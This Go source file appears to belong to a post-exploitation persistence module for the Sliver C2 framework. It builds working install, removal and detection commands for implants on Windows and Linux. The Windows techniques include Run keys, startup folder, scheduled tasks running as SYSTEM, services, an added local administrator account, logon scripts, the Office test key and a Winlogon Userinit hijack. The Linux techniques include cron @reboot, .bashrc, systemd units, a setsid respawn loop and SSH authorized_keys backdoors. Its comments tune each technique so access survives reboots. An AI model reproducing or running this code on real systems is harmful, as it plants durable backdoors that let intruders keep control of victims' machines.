package sliver

import (
	"fmt"
	"strings"
)

// shellArgv wraps a script for the platform's non-interactive shell.
//
// This stays pure: it is the single place every module's command text flows
// through, and the tests pin its exact output. Making the target's console able
// to *print* that text as UTF-8 is an execution concern, applied in
// runPersistenceCommand.
func shellArgv(platform, script string) []string {
	if platform == platformWindows {
		// The script is split into tokens rather than handed to cmd.exe as one
		// argument, and that split is what makes these modules work at all.
		//
		// Sliver's Windows exec handler builds the process with
		// exec.Command(path, args...), and Go renders an argument containing a
		// double quote by escaping it as backslash-quote -- a C-runtime
		// convention. cmd.exe has no backslash escape (its escape character is
		// caret), so it reads that sequence as a literal backslash followed by a
		// quote toggle. A single-argument script such as
		//
		//     reg add "HKCU\...\Run" /v x /t REG_SZ /d "C:\...\a.exe" /f
		//
		// therefore reaches reg.exe with mangled arguments: reg exits 0, cmd
		// reports no error, and the value is never written. The operator sees
		// "The operation completed successfully." and gets no persistence.
		//
		// Passing the tokens separately means the only quoting Go has to add is
		// for arguments containing spaces, and that quoting is plain "..." with no
		// embedded quotes -- which cmd.exe passes through correctly. Shell
		// operators (&&, &, |, >) survive as their own tokens and are still
		// interpreted by cmd, so scripts that need a shell keep working.
		//
		// "Go has to add" was the hole: Go adds quoting only for an argument with a
		// space, a tab or a quote, so a token with a metacharacter and no space was
		// handed to cmd.exe bare. protectCmdToken closes that per token, which is
		// the only layer where it can still force Go's hand.
		tokens := splitWindowsCommand(script)
		for i := range tokens {
			tokens[i] = protectCmdToken(tokens[i])
		}
		return append([]string{"cmd.exe", "/c"}, tokens...)
	}
	return []string{"/bin/sh", "-c", script}
}

// splitWindowsCommand splits a cmd.exe command line into the argv cmd.exe would
// have seen had the line been typed at a prompt.
//
// The quoting rules are cmd's, not Go's: a double quote toggles between quoted
// and unquoted and the quote characters themselves are dropped. cmd has no
// escape character outside quotes, and caret is literal inside them, so this is
// a hand-written scanner rather than strings.Fields. Getting it wrong puts us
// straight back to mangled arguments, which is why the tests pin the output.
func splitWindowsCommand(script string) []string {
	var (
		tokens  []string
		cur     strings.Builder
		inQuote bool
		haveTok bool
	)
	flush := func() {
		if haveTok {
			tokens = append(tokens, cur.String())
			cur.Reset()
			haveTok = false
		}
	}

	for i := 0; i < len(script); i++ {
		c := script[i]
		switch {
		case c == '"':
			// Toggle quoting and drop the character, exactly as cmd does.
			inQuote = !inQuote
			haveTok = true
		case (c == ' ' || c == '\t') && !inQuote:
			flush()
		case c == '^' && !inQuote && i+1 < len(script):
			// Outside quotes caret escapes the next character. Keeping the caret
			// would hand cmd a stray escape, so it is consumed and the escaped
			// character kept.
			i++
			cur.WriteByte(script[i])
			haveTok = true
		default:
			cur.WriteByte(c)
			haveTok = true
		}
	}
	flush()
	return tokens
}

// installCommand returns the argv that installs module on platform.
func installCommand(platform, module, payload, name string) ([]string, error) {
	if _, err := lookupModule(platform, module); err != nil {
		return nil, err
	}
	if strings.TrimSpace(payload) == "" {
		return nil, fmt.Errorf("module %q requires a payload", module)
	}
	if err := requireName(module, name); err != nil {
		return nil, err
	}

	switch platform {
	case platformWindows:
		qp, err := shellQuoteWindows(payload)
		if err != nil {
			return nil, err
		}
		switch module {
		case "win-run-key", "win-run-key-hklm":
			key := runKeyHKCU
			if module == "win-run-key-hklm" {
				key = runKeyHKLM
			}
			script := fmt.Sprintf(`reg add "%s" /v %s /t REG_SZ /d %s /f`, key, name, qp)
			return shellArgv(platform, script), nil
		case "win-startup-folder":
			target, err := shellQuoteWindows(startupDir + `\` + name + ".exe")
			if err != nil {
				return nil, err
			}
			script := fmt.Sprintf("copy /y %s %s", qp, target)
			return shellArgv(platform, script), nil
		case "win-schtask":
			script := fmt.Sprintf(`schtasks /create /tn %s /tr %s /sc onlogon /f`, name, qp)
			return shellArgv(platform, script), nil
		case "win-service":
			script := fmt.Sprintf(`sc create %s binPath= %s start= auto`, name, qp)
			return shellArgv(platform, script), nil
		case "win-local-account":
			// Payload is the password, not a file. `net user` enforces the local
			// password policy and reports a rejection as text, which reaches the
			// operator through the normal result message rather than being lost.
			//
			// The group is named literally rather than by SID: `net localgroup`
			// takes a name, and "Administrators" is not localised on the systems
			// this runs against. Quoting the name keeps a rich password from
			// being split by the command interpreter.
			script := fmt.Sprintf(`net user %s %s /add && net localgroup Administrators %s /add`,
				name, qp, name)
			return shellArgv(platform, script), nil
		case "win-schtask-boot":
			// /ru SYSTEM with an onstart trigger runs before any interactive
			// logon, which is the point: access survives a reboot with nobody
			// present to log in.
			script := fmt.Sprintf(`schtasks /create /tn %s /tr %s /sc onstart /ru SYSTEM /f`, name, qp)
			return shellArgv(platform, script), nil
		case "win-watchdog":
			script := fmt.Sprintf(`schtasks /create /tn %s /tr %s /sc minute /mo %d /f`, name, qp, watchdogMinutes)
			return shellArgv(platform, script), nil
		case "win-logon-script":
			// The shell reads this value as a program to run, so the payload path
			// is stored as-is. name is not part of the value -- the key holds a
			// single script -- but it still names the artifact for the inventory
			// and for removal, which is why the module is name-scoped.
			script := fmt.Sprintf(`reg add "%s" /v %s /t REG_SZ /d %s /f`,
				logonScriptKey, logonScriptValue, qp)
			return shellArgv(platform, script), nil
		case "win-office-test":
			// Office only consults the value if the key itself exists, so the
			// install creates the key explicitly before writing into it.
			script := fmt.Sprintf(`reg add "%s" /v %s /t REG_SZ /d %s /f`,
				officeTestKey, name, qp)
			return shellArgv(platform, script), nil
		case "win-winlogon-userinit":
			// Winlogon requires userinit.exe to remain the first entry in the list;
			// dropping it makes interactive logon fail and can leave the host
			// reachable only through the payload.
			//
			// The value is rewritten rather than appended in place. Appending would
			// mean parsing the existing list inside cmd.exe, and the obvious
			// `%VAR:str=%` substitution breaks on a payload path because the search
			// string contains a colon. Writing the canonical prefix plus the payload
			// keeps userinit.exe first, is idempotent (a re-install does not grow the
			// list), and needs no parsing. The tradeoff is that a host with a custom
			// Userinit already set would lose it, so the operator is told to check
			// the current value first with the registry read.
			// The whole list is quoted as one value. Quoting the payload separately
			// would place its closing quote before the value's own, producing
			// `userinit.exe,"a.exe""` -- cmd.exe rejects that and the value is left
			// unchanged. qp is already known to contain no double quote, so building
			// the value first and quoting the result is exact.
			value := winlogonUserinitExe + payload
			script := fmt.Sprintf(`reg add "%s" /v %s /t REG_SZ /d "%s" /f`,
				winlogonKey, winlogonUserinit, value)
			return shellArgv(platform, script), nil
		}
		return nil, fmt.Errorf("unknown persistence module %q", module)

	case platformLinux:
		qp := shellQuotePOSIX(payload)
		switch module {
		case "linux-cron":
			// crond re-parses the line through /bin/sh, so the path stays quoted.
			// The whole "@reboot <payload>" string is single-quoted as one unit.
			//
			// It used to be `echo "@reboot %s"` with a separately single-quoted
			// payload inside, which nests two quoting schemes: the payload's own
			// single quotes were correct, but the surrounding double quotes meant a
			// double quote in the payload closed the echo argument and the rest of
			// the line ran as a command. A plausible path such as /tmp/agent"v2 was
			// a hard "Unterminated quoted string" that left no crontab entry.
			//
			// Quoting once, after building the full string, removes the nesting
			// rather than trying to escape two layers against each other.
			script := fmt.Sprintf(`(crontab -l 2>/dev/null; echo %s) | crontab -`,
				shellQuotePOSIX("@reboot "+payload))
			return shellArgv(platform, script), nil
		case "linux-bashrc":
			script := fmt.Sprintf("echo %s >> ~/.bashrc", shellQuotePOSIX("nohup "+payload+" >/dev/null 2>&1 &"))
			return shellArgv(platform, script), nil
		case "linux-systemd":
			unit := []string{
				"[Unit]",
				"Description=" + name,
				"[Service]",
				"Type=simple",
				"ExecStart=/bin/sh -c " + qp,
				"Restart=always",
				"[Install]",
				"WantedBy=multi-user.target",
			}
			script := fmt.Sprintf("printf '%%s\\n' %s > /etc/systemd/system/%s.service && systemctl enable --now %s",
				quoteEachPOSIX(unit), name, shellQuotePOSIX(name))
			return shellArgv(platform, script), nil
		case "linux-systemd-user":
			// Same unit, but rooted in the user manager. WantedBy=default.target is
			// the user manager's equivalent of multi-user.target, and no root is
			// needed -- which is the whole point on an unprivileged session.
			unit := []string{
				"[Unit]",
				"Description=" + name,
				"[Service]",
				"Type=simple",
				"ExecStart=/bin/sh -c " + qp,
				"Restart=always",
				"[Install]",
				"WantedBy=default.target",
			}
			script := fmt.Sprintf(
				"mkdir -p ~/.config/systemd/user && printf '%%s\\n' %s > ~/.config/systemd/user/%s.service && systemctl --user daemon-reload && systemctl --user enable --now %s",
				quoteEachPOSIX(unit), name, shellQuotePOSIX(name))
			return shellArgv(platform, script), nil
		case "linux-cron-interval":
			// Re-adds the line unconditionally; a duplicate would run the payload
			// twice per tick. Removing first makes the install idempotent, which
			// matters because the operator cannot see the crontab to fix it by hand.
			script := fmt.Sprintf(
				`crontab -l 2>/dev/null | grep -v %s | crontab -; (crontab -l 2>/dev/null; echo %s) | crontab -`,
				shellQuotePOSIX(intervalSchedule+payload),
				shellQuotePOSIX(intervalSchedule+payload))
			return shellArgv(platform, script), nil
		case "linux-watchdog":
			// A supervisor loop, independent of cron and systemd, for hosts where
			// neither is usable. `setsid` detaches it from the session so it
			// outlives the shell that started it; without that the loop dies with
			// the exec and respawns nothing.
			dir := watchdogDir(name)
			loop := fmt.Sprintf(
				"while :; do pgrep -f %s >/dev/null 2>&1 || setsid nohup %s >/dev/null 2>&1 & sleep %d; done",
				shellQuotePOSIX(payload), qp, watchdogSeconds)
			// The launch is backgrounded inside a subshell and then the loop is
			// counted, so the result says whether a watchdog is really running. A
			// bare trailing `&` reports success even where setsid is absent,
			// leaving the operator believing in a supervisor that is not there.
			// The paths are double-quoted because $HOME still has to expand.
			script := fmt.Sprintf(
				"mkdir -p \"%s\" && printf '%%s\\n' %s > \"%s/loop.sh\" && chmod 700 \"%s/loop.sh\" && (setsid /bin/sh \"%s/loop.sh\" >/dev/null 2>&1 &) && sleep 1; pgrep -fc %s || true",
				dir, shellQuotePOSIX(loop), dir, dir, dir, shellQuotePOSIX(name+"/loop.sh"))
			return shellArgv(platform, script), nil
		case "linux-ssh-authorized-keys":
			script := fmt.Sprintf(
				"mkdir -p ~/.ssh && chmod 700 ~/.ssh && printf '%%s\\n' %s >> ~/.ssh/authorized_keys && chmod 600 ~/.ssh/authorized_keys",
				qp)
			return shellArgv(platform, script), nil
		}
		return nil, fmt.Errorf("unknown persistence module %q", module)
	}
	return nil, fmt.Errorf("unknown platform %q", platform)
}

// removeCommand returns the argv that removes module from platform.
func removeCommand(platform, module, payload, name string) ([]string, error) {
	if _, err := lookupModule(platform, module); err != nil {
		return nil, err
	}
	if err := requireName(module, name); err != nil {
		return nil, err
	}

	switch platform {
	case platformWindows:
		switch module {
		case "win-run-key", "win-run-key-hklm":
			key := runKeyHKCU
			if module == "win-run-key-hklm" {
				key = runKeyHKLM
			}
			return shellArgv(platform, fmt.Sprintf(`reg delete "%s" /v %s /f`, key, name)), nil
		case "win-startup-folder":
			return shellArgv(platform, fmt.Sprintf(`del /f /q "%s\%s.exe"`, startupDir, name)), nil
		case "win-schtask":
			return shellArgv(platform, fmt.Sprintf(`schtasks /delete /tn %s /f`, name)), nil
		case "win-service":
			return shellArgv(platform, fmt.Sprintf(`sc delete %s`, name)), nil
		case "win-local-account":
			return shellArgv(platform, fmt.Sprintf(`net user %s /delete`, name)), nil
		case "win-schtask-boot", "win-watchdog":
			return shellArgv(platform, fmt.Sprintf(`schtasks /delete /tn %s /f`, name)), nil
		case "win-logon-script":
			// The value name is fixed, so removing it deletes the entry itself
			// rather than a per-artifact value.
			return shellArgv(platform, fmt.Sprintf(`reg delete "%s" /v %s /f`,
				logonScriptKey, logonScriptValue)), nil
		case "win-office-test":
			return shellArgv(platform, fmt.Sprintf(`reg delete "%s" /v %s /f`,
				officeTestKey, name)), nil
		case "win-winlogon-userinit":
			// Restore the stock value instead of deleting it. Deleting Userinit
			// leaves Winlogon with nothing to run at logon, which breaks
			// interactive logon on the host.
			return shellArgv(platform, fmt.Sprintf(`reg add "%s" /v %s /t REG_SZ /d "%s" /f`,
				winlogonKey, winlogonUserinit, winlogonUserinitExe)), nil
		}
		return nil, fmt.Errorf("unknown persistence module %q", module)

	case platformLinux:
		switch module {
		case "linux-cron":
			if strings.TrimSpace(payload) == "" {
				return nil, fmt.Errorf("module %q requires a payload", module)
			}
			script := fmt.Sprintf(`crontab -l | grep -v %s | crontab -`, shellQuotePOSIX("@reboot "+payload))
			return shellArgv(platform, script), nil
		case "linux-bashrc":
			if strings.TrimSpace(payload) == "" {
				return nil, fmt.Errorf("module %q requires a payload", module)
			}
			script := sedDeleteScript("~/.bashrc", "nohup "+payload+" >/dev/null 2>&1 &")
			return shellArgv(platform, script), nil
		case "linux-systemd":
			script := fmt.Sprintf(`systemctl disable --now %s; rm -f /etc/systemd/system/%s.service`,
				shellQuotePOSIX(name), name)
			return shellArgv(platform, script), nil
		case "linux-systemd-user":
			// --user needs no root, so this is the systemd option on a host where
			// the session is not privileged. WantedBy=default.target is the user
			// manager's equivalent of multi-user.target.
			script := fmt.Sprintf(
				`systemctl --user disable --now %s; rm -f ~/.config/systemd/user/%s.service; systemctl --user daemon-reload`,
				shellQuotePOSIX(name), name)
			return shellArgv(platform, script), nil
		case "linux-cron-interval":
			script := fmt.Sprintf(`crontab -l | grep -v %s | crontab -`,
				shellQuotePOSIX(intervalSchedule+payload))
			return shellArgv(platform, script), nil
		case "linux-watchdog":
			if strings.TrimSpace(payload) == "" {
				return nil, fmt.Errorf("module %q requires a payload", module)
			}
			// Stop the loop before deleting it. Removing only the file would leave
			// the running loop in place, still respawning the payload, and the
			// operator would have no way to tell why the implant kept returning.
			// pkill matches the loop by its script path, not by the unexpanded
			// $HOME form: the pattern is single-quoted, so the shell would hand
			// pkill a literal "$HOME/..." that matches no real command line and
			// silently leave the respawn loop running.
			script := fmt.Sprintf(`pkill -f %s 2>/dev/null; rm -rf %s`,
				shellQuotePOSIX(name+"/loop.sh"), watchdogDir(name))
			return shellArgv(platform, script), nil
		case "linux-ssh-authorized-keys":
			if strings.TrimSpace(payload) == "" {
				return nil, fmt.Errorf("module %q requires a payload", module)
			}
			script := sedDeleteScript("~/.ssh/authorized_keys", payload)
			return shellArgv(platform, script), nil
		}
		return nil, fmt.Errorf("unknown persistence module %q", module)
	}
	return nil, fmt.Errorf("unknown platform %q", platform)
}

// inspectCommand returns the argv that reports whether module is present. An
// empty name means "the inventory call has no name": name-scoped modules then
// probe with a sentinel value that never matches on the target.
func inspectCommand(platform, module, name string) ([]string, error) {
	if _, err := lookupModule(platform, module); err != nil {
		return nil, err
	}
	scoped := name
	if scoped == "" {
		scoped = probeName
	}

	switch platform {
	case platformWindows:
		switch module {
		case "win-run-key", "win-run-key-hklm":
			key := runKeyHKCU
			if module == "win-run-key-hklm" {
				key = runKeyHKLM
			}
			// Omitting /v enumerates every value, which is what an inventory wants.
			if name == "" {
				return shellArgv(platform, fmt.Sprintf(`reg query "%s"`, key)), nil
			}
			return shellArgv(platform, fmt.Sprintf(`reg query "%s" /v %s`, key, name)), nil
		case "win-startup-folder":
			return shellArgv(platform, fmt.Sprintf(`dir /b "%s"`, startupDir)), nil
		case "win-schtask", "win-schtask-boot", "win-watchdog":
			// /xml, not the default table. All three modules create a task with a
			// caller-chosen name, so a name lookup alone cannot tell them apart and
			// a keep-alive task would satisfy the boot-task row. The XML names the
			// trigger and, unlike the verbose list, is a fixed schema rather than
			// localized prose.
			return shellArgv(platform, fmt.Sprintf(`schtasks /query /tn %s /xml`, scoped)), nil
		case "win-local-account":
			// Exits non-zero with "The user name could not be found" when absent,
			// which detectPersistence reads as a negative answer.
			return shellArgv(platform, fmt.Sprintf(`net user %s`, scoped)), nil
		case "win-service":
			return shellArgv(platform, fmt.Sprintf(`sc query %s`, scoped)), nil
		case "win-logon-script":
			// The value name is fixed, so a name is not needed to answer this one.
			return shellArgv(platform, fmt.Sprintf(`reg query "%s" /v %s`,
				logonScriptKey, logonScriptValue)), nil
		case "win-office-test":
			// With no name the whole key is enumerated; each value under it points
			// at some artifact, and detectPersistence reports ours when the name
			// matches.
			if name == "" {
				return shellArgv(platform, fmt.Sprintf(`reg query "%s"`, officeTestKey)), nil
			}
			return shellArgv(platform, fmt.Sprintf(`reg query "%s" /v %s`, officeTestKey, name)), nil
		case "win-winlogon-userinit":
			// Read the list so the detector can look for the payload inside it. The
			// value holds several comma-separated entries, so a plain query is the
			// right probe -- there is no per-artifact value name to ask for.
			return shellArgv(platform, fmt.Sprintf(`reg query "%s" /v %s`,
				winlogonKey, winlogonUserinit)), nil
		}
		return nil, fmt.Errorf("unknown persistence module %q", module)

	case platformLinux:
		switch module {
		case "linux-cron":
			return shellArgv(platform, "crontab -l"), nil
		case "linux-bashrc":
			return shellArgv(platform, fmt.Sprintf("grep -c %s ~/.bashrc", shellQuotePOSIX(scoped))), nil
		case "linux-systemd":
			return shellArgv(platform, fmt.Sprintf("systemctl is-enabled %s", shellQuotePOSIX(scoped))), nil
		case "linux-systemd-user":
			return shellArgv(platform, fmt.Sprintf("systemctl --user is-enabled %s", shellQuotePOSIX(scoped))), nil
		case "linux-cron-interval":
			return shellArgv(platform, "crontab -l"), nil
		case "linux-watchdog":
			// A count, not a presence check: the loop is a live process, and the
			// `|| true` keeps "nothing running" on stdout as 0 instead of turning
			// it into a non-zero exit that would read as an unknown answer.
			return shellArgv(platform,
				fmt.Sprintf("pgrep -fc %s || true", shellQuotePOSIX(scoped+"/loop.sh"))), nil
		case "linux-ssh-authorized-keys":
			return shellArgv(platform, fmt.Sprintf("grep -c %s ~/.ssh/authorized_keys", shellQuotePOSIX(scoped))), nil
		}
		return nil, fmt.Errorf("unknown persistence module %q", module)
	}
	return nil, fmt.Errorf("unknown platform %q", platform)
}
